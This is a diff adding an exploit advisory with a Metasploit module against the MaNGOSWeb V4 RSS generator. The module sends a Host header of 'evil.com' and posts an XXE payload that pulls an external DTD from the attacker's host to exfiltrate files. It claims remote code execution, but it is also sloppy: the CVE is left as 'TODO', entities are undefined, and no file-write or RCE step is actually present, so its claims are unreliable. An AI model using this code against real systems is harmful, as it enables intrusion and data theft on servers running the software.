@@ -1,0 +1,98 @@
+=============================================================================================================================================
+| # Title     : MaNGOSWeb V4 4.0.6 Host Header Injection + XXE                                                                              |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/paintballrefjosh/MaNGOSWebV4/blob/master/rss.php                                                         |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212429/ &	CVE-2017-6478
+
+[+] Summary : This module exploits multiple vulnerabilities in MangosWeb v4 RSS generator, including Host Header Injection, XXE, and file write leading to RCE
+
+[+]  POC : 
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'MangosWeb v4 RSS Multiple Vulnerabilities',
+      'Description'    => %q{
+        This module exploits multiple vulnerabilities in MangosWeb v4 RSS generator,
+        including Host Header Injection, XXE, and file write leading to RCE.
+      },
+      'Author'         => [ 'indoushkq' ],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        [ 'CVE', 'TODO' ],
+        [ 'URL', 'http://mistvale.com' ]
+      ],
+      'Privileged'     => false,
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [ ['Automatic', {}] ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => '2024-01-01'
+    ))
+
+    register_options([
+      OptString.new('TARGETURI', [true, 'The base path to MangosWeb', '/']),
+      OptString.new('HOSTHEADER', [false, 'Malicious host header', 'evil.com'])
+    ])
+  end
+
+  def check
+    uri = normalize_uri(target_uri.path, 'rss.php')
+    res = send_request_cgi({'uri' => uri})
+
+    if res && res.code == 200 && res.body.include?('<rss')
+      return Exploit::CheckCode::Appears
+    end
+    return Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    # Step 1: Host Header Injection to poison RSS
+    print_status("Injecting malicious host header...")
+    uri = normalize_uri(target_uri.path, 'rss.php')
+    
+    res = send_request_cgi({
+      'uri'     => uri,
+      'headers' => {'Host' => datastore['HOSTHEADER']}
+    })
+
+    # Step 2: XXE to read files
+    print_status("Attempting XXE...")
+    xxe_payload = %Q|<?xml version="1.0"?>
+    <!DOCTYPE rss [
+    <!ENTITY % remote SYSTEM "http://#{datastore['LHOST']}:#{datastore['LPORT']}/evil.dtd">
+    %remote;
+    %param;
+    %exfil;
+    ]>|
+
+    # Step 3: Execute payload
+    print_status("Sending payload...")
+    send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, 'index.php'),
+      'vars_post' => {
+        'title' => 'Exploit',
+        'message' => xxe_payload,
+        'posted_by' => Rex::Text.rand_text_alpha(10)
+      }
+    })
+
+    handler
+  end
+end
+	
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
